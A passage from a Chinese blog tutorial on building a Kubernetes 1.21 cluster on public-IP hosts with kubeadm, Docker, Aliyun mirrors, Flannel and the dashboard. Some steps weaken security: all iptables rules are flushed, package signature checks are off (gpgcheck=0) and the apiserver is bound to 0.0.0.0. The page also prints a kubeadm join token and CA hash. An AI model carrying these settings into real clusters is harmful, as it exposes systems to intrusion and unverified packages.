/etc/fstab</span><br></pre></td></tr></table></figure><p>配置 iptables 的 ACCEPT 规则</p><figure class="highlight r"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">iptables -<span class="built_in">F</span> &amp;&amp; iptables -X &amp;&amp; iptables -<span class="built_in">F</span> -t nat &amp;&amp; iptables -X -t nat &amp;&amp; iptables -P FORWARD ACCEPT</span><br></pre></td></tr></table></figure><p>设置系统参数</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">cat &lt;&lt;<span class="string">EOF&gt; /etc/sysctl.d/k8s.conf </span></span><br><span class="line"><span class="string">net.bridge.bridge-nf-call-ip6tables = 1 </span></span><br><span class="line"><span class="string">net.bridge.bridge-nf-call-iptables = 1 </span></span><br><span class="line"><span class="string">EOF</span></span><br><span class="line">sysctl --system</span><br></pre></td></tr></table></figure><h1 id="三、安装-Docker"><a href="#三、安装-Docker" class="headerlink" title="三、安装 Docker"></a>三、安装 Docker</h1><h2 id="1-配置阿里云镜像源"><a href="#1-配置阿里云镜像源" class="headerlink" title="1.配置阿里云镜像源"></a>1.配置阿里云镜像源</h2><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">sudo yum-config-manager \</span><br><span class="line">    --<span class="keyword">add</span>-repo http:<span class="comment">//mirrors.aliyun.com/docker-ce/linux/centos/docker-ce.repo</span></span><br><span class="line"></span><br><span class="line"><span class="meta"># 查看 Docker-CE</span></span><br><span class="line">yum list | grep docker-ce</span><br><span class="line"></span><br><span class="line"><span class="meta"># 更新 yum 缓存</span></span><br><span class="line">sudo yum makecache fast</span><br></pre></td></tr></table></figure><h2 id="2-安装-Docker"><a href="#2-安装-Docker" class="headerlink" title="2.安装 Docker"></a>2.安装 Docker</h2><p>安装指定版本 20.10.21</p><figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo yum install -y docker-ce<span class="number">-20.10</span><span class="number">.21</span> docker-ce-cli<span class="number">-20.10</span><span class="number">.21</span> containerd.<span class="built_in">io</span></span><br></pre></td></tr></table></figure><h2 id="3-启动-Docker"><a href="#3-启动-Docker" class="headerlink" title="3.启动 Docker"></a>3.启动 Docker</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 启动 Docker</span></span><br><span class="line">sudo systemctl start docker</span><br><span class="line"><span class="comment"># 设置开机启动 Docker</span></span><br><span class="line">sudo systemctl <span class="built_in">enable</span> docker</span><br></pre></td></tr></table></figure><h1 id="四、安装-Kubernetes-集群所需组件"><a href="#四、安装-Kubernetes-集群所需组件" class="headerlink" title="四、安装 Kubernetes 集群所需组件"></a>四、安装 Kubernetes 集群所需组件</h1><h2 id="一-安装-kubeadm-kubelete-kubectl"><a href="#一-安装-kubeadm-kubelete-kubectl" class="headerlink" title="(一) 安装 kubeadm, kubelete, kubectl"></a>(一) 安装 kubeadm, kubelete, kubectl</h2><h3 id="1-配置-yum-源"><a href="#1-配置-yum-源" class="headerlink" title="1.配置 yum 源"></a>1.配置 yum 源</h3><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">cat &lt;&lt;EOF&gt; /etc/yum.repos.d/kubernetes.repo </span><br><span class="line"><span class="section">[kubernetes]</span> </span><br><span class="line"><span class="attr">name</span>=Kubernetes </span><br><span class="line"><span class="attr">baseurl</span>=http://mirrors.aliyun.com/kubernetes/yum/repos/kubernetes-el7-x<span class="number">86_64</span> </span><br><span class="line"><span class="attr">enabled</span>=<span class="number">1</span> </span><br><span class="line"><span class="attr">gpgcheck</span>=<span class="number">0</span> </span><br><span class="line"><span class="attr">repo_gpgcheck</span>=<span class="number">0</span> </span><br><span class="line"><span class="attr">gpgkey</span>=http://mirrors.aliyun.com/kubernetes/yum/doc/yum-key.gpg </span><br><span class="line">    http://mirrors.aliyun.com/kubernetes/yum/doc/rpm-package-key.gpg </span><br><span class="line">EOF</span><br></pre></td></tr></table></figure><h3 id="2-开始安装"><a href="#2-开始安装" class="headerlink" title="2.开始安装"></a>2.开始安装</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 确认 yum 中是否有指定版本</span></span><br><span class="line">yum list kubeadm --showduplicates | sort -r</span><br><span class="line"></span><br><span class="line"><span class="comment"># 安装 1.21.0-0</span></span><br><span class="line">yum install -y kubeadm-1.21.0-0 kubelet-1.21.0-0 kubectl-1.21.0-0</span><br></pre></td></tr></table></figure><h3 id="3-Docker-和-K8s-设置为同一个-cgroup"><a href="#3-Docker-和-K8s-设置为同一个-cgroup" class="headerlink" title="3.Docker 和 K8s 设置为同一个 cgroup"></a>3.Docker 和 K8s 设置为同一个 cgroup</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">(1) 修改 daemon.json</span><br><span class="line">vim /etc/docker/daemon.json</span><br><span class="line">设置 cgroup</span><br><span class="line"><span class="string">&quot;exec-opts&quot;</span>: [<span class="string">&quot;native.cgroupdriver=systemd&quot;</span>]</span><br><span class="line"></span><br><span class="line">(2) 重启 Docker</span><br><span class="line">systemctl restart docker</span><br><span class="line"></span><br><span class="line">(3) 检查 kubelet，如果在输出信息中发现 No such file or directory，说明没问题</span><br><span class="line">sed -i <span class="string">&quot;s/cgroup-driver=systemd/cgroup-driver=cgroupfs/g&quot;</span> /etc/systemd/system/kubelet.service.d/10-kubeadm.conf</span><br></pre></td></tr></table></figure><h3 id="4-修改-kubelet-启动参数"><a href="#4-修改-kubelet-启动参数" class="headerlink" title="4.修改 kubelet 启动参数"></a>4.修改 kubelet 启动参数</h3><p>每台主机都要添加并指定对应的公网 IP，然后才能使用公网 IP 进行集群间通信</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">vim /usr/lib/systemd/system/kubelet.service.d/10-kubeadm.conf</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>在 KUBELET_KUBECONFIG_ARGS 后面追加 –node-ip=<public_ip>（此处填写你的公网ip）</p><p>修改之后执行 daemon-reload 让修改生效</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">systemctl daemon-reload</span><br></pre></td></tr></table></figure><h3 id="5-启动-kubelet-重启-kubelet"><a href="#5-启动-kubelet-重启-kubelet" class="headerlink" title="5.启动 kubelet / 重启 kubelet"></a>5.启动 kubelet / 重启 kubelet</h3><p>启动 kubelet</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">systemctl <span class="built_in">enable</span> kubelet &amp;&amp; systemctl start kubelet</span><br></pre></td></tr></table></figure><p>重启 kubelet</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">systemctl restart kubelet</span><br></pre></td></tr></table></figure><h2 id="二-拉取-kube-proxy-scheduler-等镜像"><a href="#二-拉取-kube-proxy-scheduler-等镜像" class="headerlink" title="(二) 拉取 kube-proxy, scheduler 等镜像"></a>(二) 拉取 kube-proxy, scheduler 等镜像</h2><p>需要通过国内镜像源下载镜像</p><h3 id="1-查看-kubeadm-所需镜像"><a href="#1-查看-kubeadm-所需镜像" class="headerlink" title="1.查看 kubeadm 所需镜像"></a>1.查看 kubeadm 所需镜像</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kubeadm config images list</span><br></pre></td></tr></table></figure><p>输出信息如下</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">k8s.gcr.io/kube-apiserver:v1.21.14</span><br><span class="line">k8s.gcr.io/kube-controller-manager:v1.21.14</span><br><span class="line">k8s.gcr.io/kube-scheduler:v1.21.14</span><br><span class="line">k8s.gcr.io/kube-proxy:v1.21.14</span><br><span class="line">k8s.gcr.io/pause:3.4.1</span><br><span class="line">k8s.gcr.io/etcd:3.4.13-0</span><br><span class="line">k8s.gcr.io/coredns/coredns:v1.8.0</span><br></pre></td></tr></table></figure><p>遗憾的是需要科学上网才能下载这些镜像</p><h3 id="2-尝试用国内镜像源拉取镜像"><a href="#2-尝试用国内镜像源拉取镜像" class="headerlink" title="2.尝试用国内镜像源拉取镜像"></a>2.尝试用国内镜像源拉取镜像</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker pull registry.cn-hangzhou.aliyuncs.com/google_containers/kube-apiserver:v1.21.14</span><br></pre></td></tr></table></figure><p>经过测试，可以正常拉取，因此编写一个 Shell 脚本，通过国内镜像源拉取 kubeadm 所需镜像</p><p>切换到一个目录，编写 kubeadm_image.sh，用于从阿里云镜像源拉取镜像 / 重新打 tag / 删除原镜像</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/usr/bin/env bash</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 镜像处理过程中，如果遇到错误，立即退出</span></span><br><span class="line"><span class="built_in">set</span> -e</span><br><span class="line"></span><br><span class="line"><span class="comment"># 版本定义</span></span><br><span class="line"><span class="built_in">readonly</span> KUBE_VERSION=v1.21.0</span><br><span class="line"><span class="built_in">readonly</span> PAUSE_VERSION=3.4.1</span><br><span class="line"><span class="built_in">readonly</span> ETCD_VERSION=3.4.13-0</span><br><span class="line"><span class="built_in">readonly</span> CORE_DNS_VERSION=v1.8.0</span><br><span class="line"><span class="built_in">readonly</span> OFFICIAL_URL=k8s.gcr.io</span><br><span class="line"><span class="built_in">readonly</span> ALIYUN_URL=registry.cn-hangzhou.aliyuncs.com/google_containers</span><br><span class="line"></span><br><span class="line"><span class="comment"># 镜像列表</span></span><br><span class="line">imageList=(kube-apiserver:<span class="variable">$&#123;KUBE_VERSION&#125;</span> </span><br><span class="line">kube-controller-manager:<span class="variable">$&#123;KUBE_VERSION&#125;</span> </span><br><span class="line">kube-scheduler:<span class="variable">$&#123;KUBE_VERSION&#125;</span> </span><br><span class="line">kube-proxy:<span class="variable">$&#123;KUBE_VERSION&#125;</span> </span><br><span class="line">pause:<span class="variable">$&#123;PAUSE_VERSION&#125;</span> </span><br><span class="line">etcd:<span class="variable">$&#123;ETCD_VERSION&#125;</span> </span><br><span class="line">coredns:<span class="variable">$&#123;CORE_DNS_VERSION&#125;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 镜像转换操作</span></span><br><span class="line"><span class="keyword">for</span> imageItem <span class="keyword">in</span> <span class="variable">$&#123;imageList[@]&#125;</span> ; <span class="keyword">do</span> </span><br><span class="line">  <span class="comment"># 从国内镜像源拉取镜像</span></span><br><span class="line">  docker pull <span class="variable">$ALIYUN_URL</span>/<span class="variable">$imageItem</span></span><br><span class="line">  <span class="comment"># 给镜像重新打一个标签，命名为 kubeadm 所需的镜像</span></span><br><span class="line">  docker tag <span class="variable">$ALIYUN_URL</span>/<span class="variable">$imageItem</span> <span class="variable">$OFFICIAL_URL</span>/<span class="variable">$imageItem</span></span><br><span class="line">  <span class="comment"># 删除原有镜像</span></span><br><span class="line">  docker rmi <span class="variable">$ALIYUN_URL</span>/<span class="variable">$imageItem</span></span><br><span class="line"><span class="keyword">done</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># coredns 的镜像比较特殊，单独处理</span></span><br><span class="line">docker tag <span class="variable">$&#123;OFFICIAL_URL&#125;</span>/coredns:<span class="variable">$&#123;CORE_DNS_VERSION&#125;</span> <span class="variable">$&#123;OFFICIAL_URL&#125;</span>/coredns/coredns:<span class="variable">$&#123;CORE_DNS_VERSION&#125;</span></span><br><span class="line">docker rmi <span class="variable">$&#123;OFFICIAL_URL&#125;</span>/coredns:<span class="variable">$&#123;CORE_DNS_VERSION</span></span><br></pre></td></tr></table></figure><p>运行脚本</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sh ./kubeadm_image.sh</span><br></pre></td></tr></table></figure><h1 id="五、搭建-Kubernetes-集群"><a href="#五、搭建-Kubernetes-集群" class="headerlink" title="五、搭建 Kubernetes 集群"></a>五、搭建 Kubernetes 集群</h1><h2 id="一-用-kubeadm-初始化-master-节点"><a href="#一-用-kubeadm-初始化-master-节点" class="headerlink" title="(一)用 kubeadm 初始化 master 节点"></a>(一)用 kubeadm 初始化 master 节点</h2><h3 id="1-执行-kubeadm-init"><a href="#1-执行-kubeadm-init" class="headerlink" title="1.执行 kubeadm init"></a>1.执行 kubeadm init</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">kubeadm init --kubernetes-version=1.21.0 \</span><br><span class="line">  --apiserver-advertise-address=39.98.182.32 \</span><br><span class="line">  --pod-network-cidr=10.244.0.0/16 \</span><br><span class="line">  -v=5</span><br></pre></td></tr></table></figure><p>输出日志中出现如下信息时，说明 master 节点已经初始化成功了</p><blockquote><p>Your Kubernetes control-plane has initialized successfully!</p></blockquote><p>将末尾的 kubeadm join 信息保存起来，后面的步骤中需要在 worker 节点执行</p><h3 id="2-集群健康检查"><a href="#2-集群健康检查" class="headerlink" title="2.集群健康检查"></a>2.集群健康检查</h3><p>执行如下命令</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mkdir -p $HOME/.kube</span><br><span class="line">sudo cp -i /etc/kubernetes/admin.conf $HOME/.kube/config</span><br><span class="line">sudo chown $(id -u):$(id -g) $HOME/.kube/config</span><br></pre></td></tr></table></figure><p>集群健康检查</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># 检查集群状态</span><br><span class="line">kubectl cluster-info</span><br><span class="line"></span><br><span class="line"># 健康检查</span><br><span class="line">curl -k https://localhost:6443/healthz</span><br></pre></td></tr></table></figure><h3 id="3-修改kube-apiserver-配置"><a href="#3-修改kube-apiserver-配置" class="headerlink" title="3.修改kube-apiserver 配置"></a>3.修改kube-apiserver 配置</h3><p>kube-apiserver 添加 –bind-address=0.0.0.0，确认 –advertise-addres=&lt;公网 IP&gt;</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vim /etc/kubernetes/manifests/kube-apiserver.yaml</span><br></pre></td></tr></table></figure><h2 id="二-安装网络插件-Flannel"><a href="#二-安装网络插件-Flannel" class="headerlink" title="(二)安装网络插件 Flannel"></a>(二)安装网络插件 Flannel</h2><h3 id="1-当前集群状态"><a href="#1-当前集群状态" class="headerlink" title="1.当前集群状态"></a>1.当前集群状态</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">kubectl <span class="keyword">get</span> pods <span class="operator">-</span>n kube<span class="operator">-</span><span class="keyword">system</span></span><br><span class="line">kubectl <span class="keyword">get</span> nodes</span><br></pre></td></tr></table></figure><p>可以看到，两个 coredns 还是 Pending 状态，此时还缺少网络插件</p><h3 id="2-安装-Flannel-网络插件"><a href="#2-安装-Flannel-网络插件" class="headerlink" title="2.安装 Flannel 网络插件"></a>2.安装 Flannel 网络插件</h3><p>Kubernetes 为了让网络功能更加灵活，制定了 CNI 规范，由第三方实现网络的细节功能。目前有多种网络插件可供选择，使用较多的是 Calico 和 Flannel，其他的网络插件参考官方文档：<a href="https://link.juejin.cn/?target=https://kubernetes.io/docs/concepts/cluster-administration/addons/">链接</a></p><p>由于公网环境使用 Calico 网络插件配置比较复杂，也没有调试成功，因此本文使用 Flannel 网络插件，安装命令如下，在 master 节点执行</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 进入一个目录，假设为 /var/local/k8s</span></span><br><span class="line">wget <span class="symbol">https:</span>/<span class="regexp">/raw.githubusercontent.com/coreos</span><span class="regexp">/flannel/master</span><span class="regexp">/Documentation/kube</span>-flannel.yml</span><br></pre></td></tr></table></figure><p>修改 kube-flannel.yml，新增 2 个配置</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vim kube-flannel.yml</span><br></pre></td></tr></table></figure><p>第 1 处</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">containers:</span><br><span class="line">- name: kube-flannel</span><br><span class="line">  #image: flannelcni/flannel:v0.20.2 #for ppc64le and mips64le (dockerhub limitations may apply)</span><br><span class="line">  image: docker.io/rancher/mirrored-flannelcni-flannel:v0.20.2</span><br><span class="line">  command:</span><br><span class="line">  - /opt/bin/flanneld</span><br><span class="line">  args:</span><br><span class="line">  - --public-ip=$(PUBLIC_IP)</span><br><span class="line">  - --iface=eth0</span><br><span class="line">  - --ip-masq</span><br><span class="line">  - --kube-subnet-mgr</span><br></pre></td></tr></table></figure><p>第 2 处</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">env:</span><br><span class="line">- name: PUBLIC_IP</span><br><span class="line">  valueFrom:</span><br><span class="line">    fieldRef:</span><br><span class="line">      fieldPath: status.podIP</span><br></pre></td></tr></table></figure><p>执行安装命令</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kubectl apply -f kube-flannel.yml</span><br></pre></td></tr></table></figure><h2 id="三-用-kubeadm-将从节点加入集群"><a href="#三-用-kubeadm-将从节点加入集群" class="headerlink" title="(三)用 kubeadm 将从节点加入集群"></a>(三)用 kubeadm 将从节点加入集群</h2><p>执行如下命令，将 worker 节点加入集群</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">kubeadm <span class="keyword">join</span> <span class="number">139.196</span><span class="number">.219</span><span class="number">.92</span>:<span class="number">6443</span> <span class="comment">--token o0zxc6.fmmh2sn8wlbt9onm \</span></span><br><span class="line">  <span class="comment">--discovery-token-ca-cert-hash sha256:a52cec58178c402ecaecc74375d49495c1bf13661dd0b25b158e7caf5d619fa6 \</span></span><br><span class="line">  <span class="operator">-</span>v<span class="operator">=</span><span class="number">5</span></span><br><span class="line">复制代码</span><br></pre></td></tr></table></figure><p>输出日志中出现如下信息时，说明 worker 节点已经成功加入集群</p><blockquote><p>This node has joined the cluster</p></blockquote><h1 id="六、部署dashboard"><a href="#六、部署dashboard" class="headerlink" title="六、部署dashboard"></a>六、部署dashboard</h1><h2 id="1、部署"><a href="#1、部署" class="headerlink" title="1、部署"></a>1、部署</h2><p>kubernetes官方提供的可视化界面</p><p><a href="https://github.com/kubernetes/dashboard">https://github.com/kubernetes/dashboard</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kubectl apply -f https://raw.githubusercontent.com/kubernetes/dashboard/v2.3.1/aio/deploy/recommended.yaml</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br></pre></td><td class="code"><pre><span class="line"># Copyright 2017 The Kubernetes Authors.</span><br><span class="line">#</span><br><span class="line"># Licensed under the Apache License, Version 2.0 (the &quot;License&quot;);</span><br><span class="line"># you may not use this file except in compliance with the License.</span><br><span class="line"># You may obtain a copy of the License at</span><br><span class="line">#</span><br><span class="line">#     http://www.apache.org/licenses/LICENSE-2.0</span><br><span class="line">#</span><br><span class="line"># Unless required by applicable law or agreed to in writing, software</span><br><span class="line"># distributed under the License is distributed on an &quot;AS IS&quot; BASIS,</span><br><span class="line"># WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.</span><br><span class="line"># See the License for the specific language governing permissions and</span><br><span class="line"># limitations under the License.</span><br><span class="line"></span><br><span class="line">apiVersion: v1</span><br><span class="line">kind: Namespace</span><br><span class="line">metadata:</span><br><span class="line">  name: kubernetes-dashboard</span><br><span class="line"></span><br><span class="line">---</span><br><span class="line"></span><br><span class="line">apiVersion: v1</span><br><span class="line">kind: ServiceAccount</span><br><span class="line">metadata:</span><br><span class="line">  labels:</span><br><span class="line">    k8s-app: kubernetes-dashboard</span><br><span class="line">  name: kubernetes-dashboard</span><br><span class="line">  namespace: kubernetes-dashboard</span><br><span class="line"></span><br><span class="line">---</span><br><span class="line"></span><br><span class="line">kind: Service</span><br><span class="line">apiVersion: 